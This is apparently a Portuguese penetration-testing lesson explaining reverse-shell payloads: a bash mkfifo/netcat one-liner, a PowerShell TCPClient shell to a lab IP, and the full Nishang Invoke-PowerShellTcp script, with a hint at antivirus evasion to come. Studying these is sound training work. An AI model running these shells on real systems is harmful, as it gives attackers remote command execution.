`Have you ever sent an email or text to someone?`

A maioria de nós provavelmente tem. A mensagem que enviamos em um email ou texto é a carga útil do pacote, pois é enviada pela vasta Internet. Na computação, a carga útil é a mensagem pretendida. Na segurança da informação, a carga útil é o comando e / ou código que explora a vulnerabilidade em um sistema operacional e / ou aplicativo. A carga útil é o comando e / ou código que executa a ação maliciosa de uma perspectiva defensiva. Como vimos na seção de shells reversos, o Windows Defender interrompeu a execução de nossa carga útil do PowerShell porque era considerado um código malicioso.

Lembre-se de que, quando entregamos e executamos cargas úteis, como qualquer outro programa, fornecemos instruções ao computador de destino sobre o que ele precisa fazer. Os termos "malware" e "código malicioso" romantizam o processo e o tornam mais misterioso do que é. Sempre que trabalhamos com cargas úteis, vamos nos desafiar a explorar o que o código e os comandos estão realmente fazendo. Começaremos esse processo dividindo as linhas com as quais trabalhamos anteriormente:

## Examinados de uma linha


Esse comando é uma linha de comando shell que consiste em várias partes para criar uma conexão de shell reverso a um servidor especificado. Vamos analisar cada parte do comando:

1. `rm -f /tmp/f;`: Remove o arquivo `/tmp/f`, se ele existir. O `-f` é usado para evitar a exibição de mensagens de erro caso o arquivo não exista.
2. `mkfifo /tmp/f;`: Cria um FIFO (First-In, First-Out) chamado `/tmp/f`. Um FIFO é um arquivo especial que permite a comunicação entre processos.
3. `cat /tmp/f | /bin/bash -i 2>&1 | nc -l 10.129.41.200 7777 > /tmp/f`: Essa é a parte principal do comando, que estabelece a conexão de shell reverso.
    - `cat /tmp/f`: Lê o conteúdo do FIFO `/tmp/f`.
    - `|`: Redireciona a saída do comando anterior para o próximo comando.
    - `/bin/bash -i 2>&1`: Executa o shell interativo `/bin/bash` com a opção `-i` para obter uma interface interativa. O `2>&1` redireciona a saída de erro (stderr) para o mesmo local que a saída padrão (stdout).
    - `|`: Redireciona a saída do comando anterior para o próximo comando.
    - `nc -l 10.129.41.200 7777`: Inicia o netcat em modo de escuta (`-l`) no endereço IP `10.129.41.200` e porta `7777`. Isso cria um servidor que aguarda por uma conexão de entrada.
    - `>`: Redireciona a saída do comando anterior para o arquivo `/tmp/f`. Isso faz com que a saída do shell interativo seja redirecionada para o FIFO criado no início do comando.

Resumindo, esse comando cria um FIFO, lê seu conteúdo com `cat`, executa um shell interativo `/bin/bash` cuja saída é redirecionada para o netcat, e a conexão é estabelecida com um servidor especificado. A interação no shell remoto será redirecionada de volta para o FIFO, que pode ser lido pelo comando `cat`. Isso permite que o usuário remoto interaja com o shell do servidor.

## PowerShell One-liner Explained

`powershell -nop -c "<código>"`

- `powershell`: Inicia uma instância do interpretador do PowerShell.
- `-nop`: Abreviação de "NoProfile". Inicia o PowerShell sem a execução do arquivo de perfil do usuário.
- `-c`: Abreviação de "Command". Permite que você especifique um comando ou script para ser executado no PowerShell.

Aqui está o código que está sendo executado:

powershellCopy code

`$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158', 443) $stream = $client.GetStream() [byte[]]$bytes = 0..65535 | ForEach-Object { 0 } while (($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {     $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i)     $sendback = (iex $data 2>&1 | Out-String)     $sendback2 = $sendback + 'PS ' + (Get-Location).Path + '> '     $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)     $stream.Write($sendbyte, 0, $sendbyte.Length)     $stream.Flush() } $client.Close()`

Aqui estão as explicações de cada parte do código:

1. `$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158', 443)`: Cria um objeto `TCPClient` para estabelecer uma conexão TCP com o endereço IP "10.10.14.158" na porta 443.
2. `$stream = $client.GetStream()`: Obtém o fluxo de dados da conexão TCP estabelecida.
3. `[byte[]]$bytes = 0..65535 | ForEach-Object { 0 }`: Cria um array de bytes para armazenar os dados recebidos da conexão.
4. `while (($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) { ... }`: Entra em um loop que lê os dados recebidos da conexão TCP.
5. `$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i)`: Converte os bytes recebidos em uma string usando a codificação ASCII.
6. `$sendback = (iex $data 2>&1 | Out-String)`: Executa a string de comando recebida usando `iex` (Invoke-Expression), captura a saída e os erros resultantes e os armazena em `$sendback`.
7. `$sendback2 = $sendback + 'PS ' + (Get-Location).Path + '> '`: Cria uma string contendo a saída do comando executado, seguida de "PS" (indicando PowerShell), o diretório atual e o prompt de comando (">").
8. `$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)`: Converte a string `$sendback2` em um array de bytes usando a codificação ASCII.
9. `$stream.Write($sendbyte, 0, $sendbyte.Length)`: Escreve os bytes no fluxo de dados da conexão.
10. `$stream.Flush()`: Limpa o buffer do fluxo de dados.
11. `$client.Close()`: Encerra a conexão TCP.

Em resumo, esse comando PowerShell estabelece uma conexão de reverse shell com um servidor remoto, enviando os comandos recebidos para execução no PowerShell do servidor e retornando a saída do comando para o cliente. O cliente pode enviar comandos interativos para o servidor e receber a resposta de volta. Lembre-se de que o uso de reverse shells pode ter implicações de segurança e só deve ser usado em ambientes controlados e com permissão adequada.

O one-liner que acabamos de examinar juntos também pode ser executado na forma de um script PowerShell (`.ps1`). Podemos ver um exemplo disso visualizando o código fonte abaixo. Este código fonte faz parte do projeto [nishang](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1):

```powershell
function Invoke-PowerShellTcp 
{ 
<#
.SYNOPSIS
Nishang script which can be used for Reverse or Bind interactive PowerShell from a target. 
.DESCRIPTION
This script is able to connect to a standard Netcat listening on a port when using the -Reverse switch. 
Also, a standard Netcat can connect to this script Bind to a specific port.
The script is derived from Powerfun written by Ben Turner & Dave Hardy
.PARAMETER IPAddress
The IP address to connect to when using the -Reverse switch.
.PARAMETER Port
The port to connect to when using the -Reverse switch. When using -Bind it is the port on which this script listens.
.EXAMPLE
PS > Invoke-PowerShellTcp -Reverse -IPAddress 192.168.254.226 -Port 4444
Above shows an example of an interactive PowerShell reverse connect shell. A netcat/powercat listener must be listening on 
the given IP and port. 
.EXAMPLE
PS > Invoke-PowerShellTcp -Bind -Port 4444
Above shows an example of an interactive PowerShell bind connect shell. Use a netcat/powercat to connect to this port. 
.EXAMPLE
PS > Invoke-PowerShellTcp -Reverse -IPAddress fe80::20c:29ff:fe9d:b983 -Port 4444
Above shows an example of an interactive PowerShell reverse connect shell over IPv6. A netcat/powercat listener must be
listening on the given IP and port. 
.LINK
http://www.labofapenetrationtester.com/2015/05/week-of-powershell-shells-day-1.html
https://github.com/nettitude/powershell/blob/master/powerfun.ps1
https://github.com/samratashok/nishang
#>      
    [CmdletBinding(DefaultParameterSetName="reverse")] Param(

        [Parameter(Position = 0, Mandatory = $true, ParameterSetName="reverse")]
        [Parameter(Position = 0, Mandatory = $false, ParameterSetName="bind")]
        [String]
        $IPAddress,

        [Parameter(Position = 1, Mandatory = $true, ParameterSetName="reverse")]
        [Parameter(Position = 1, Mandatory = $true, ParameterSetName="bind")]
        [Int]
        $Port,

        [Parameter(ParameterSetName="reverse")]
        [Switch]
        $Reverse,

        [Parameter(ParameterSetName="bind")]
        [Switch]
        $Bind

    )

    
    try 
    {
        #Connect back if the reverse switch is used.
        if ($Reverse)
        {
            $client = New-Object System.Net.Sockets.TCPClient($IPAddress,$Port)
        }

        #Bind to the provided port if Bind switch is used.
        if ($Bind)
        {
            $listener = [System.Net.Sockets.TcpListener]$Port
            $listener.start()    
            $client = $listener.AcceptTcpClient()
        } 

        $stream = $client.GetStream()
        [byte[]]$bytes = 0..65535|%{0}

        #Send back current username and computername
        $sendbytes = ([text.encoding]::ASCII).GetBytes("Windows PowerShell running as user " + $env:username + " on " + $env:computername + "`nCopyright (C) 2015 Microsoft Corporation. All rights reserved.`n`n")
        $stream.Write($sendbytes,0,$sendbytes.Length)

        #Show an interactive PowerShell prompt
        $sendbytes = ([text.encoding]::ASCII).GetBytes('PS ' + (Get-Location).Path + '>')
        $stream.Write($sendbytes,0,$sendbytes.Length)

        while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
        {
            $EncodedText = New-Object -TypeName System.Text.ASCIIEncoding
            $data = $EncodedText.GetString($bytes,0, $i)
            try
            {
                #Execute the command on the target.
                $sendback = (Invoke-Expression -Command $data 2>&1 | Out-String )
            }
            catch
            {
                Write-Warning "Something went wrong with execution of command on the target." 
                Write-Error $_
            }
            $sendback2  = $sendback + 'PS ' + (Get-Location).Path + '> '
            $x = ($error[0] | Out-String)
            $error.clear()
            $sendback2 = $sendback2 + $x

            #Return the results
            $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
            $stream.Write($sendbyte,0,$sendbyte.Length)
            $stream.Flush()  
        }
        $client.Close()
        if ($listener)
        {
            $listener.Stop()
        }
    }
    catch
    {
        Write-Warning "Something went wrong! Check if the server is reachable and you are using the correct port." 
        Write-Error $_
    }
}
```

## Cargas úteis assumem formas e formulários diferentes

Compreender o que diferentes tipos de cargas úteis estão fazendo pode nos ajudar a entender por que o AV está nos impedindo de executar e nos dá uma ideia do que precisamos mudar em nosso código para restrições de desvio. Isso é algo que exploraremos mais neste módulo. Por enquanto, entenda que as cargas úteis que usamos para obter um shell em um sistema serão determinadas em grande parte pelo sistema operacional, linguagens de intérpretes de shell, e até linguagens de programação estão presentes no alvo.

Nem todas as cargas úteis são one-liners e implantadas manualmente como as que estudamos nesta seção. Alguns são gerados usando estruturas de ataque automatizadas e implantados como um ataque pré-embalado / automatizado para obter um shell. Como nos muito poderosos `Metasploit-framework`.